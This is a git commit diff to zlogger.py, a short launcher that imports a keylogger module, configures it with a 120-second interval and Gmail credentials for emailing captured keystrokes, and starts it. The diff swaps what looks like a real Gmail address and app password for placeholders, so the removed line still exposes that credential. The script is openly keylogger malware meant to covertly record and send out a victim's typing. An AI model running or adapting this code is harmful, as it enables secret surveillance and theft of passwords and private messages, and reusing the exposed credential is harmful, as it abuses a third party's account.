e0cf60eebfb2bc2d1a5e5a5adc001721a8c26e7c
Sulaiman Eksambi <sulaimaneksambi@gmail.com>
2025-03-16 15:50:01 +0530

    Update zlogger.py

--- zlogger.py
+++ zlogger.py
@@ -1,6 +1,6 @@
 import keylogger
 
-my_keylogger = keylogger.Keylogger(120,"sulaimaneksambi@gmail.com","wmzzdxotxypxpmze")
+my_keylogger = keylogger.Keylogger(120,"your_mail@gmail.com","email_app_key")
 try:
     my_keylogger.start()
 except KeyboardInterrupt:
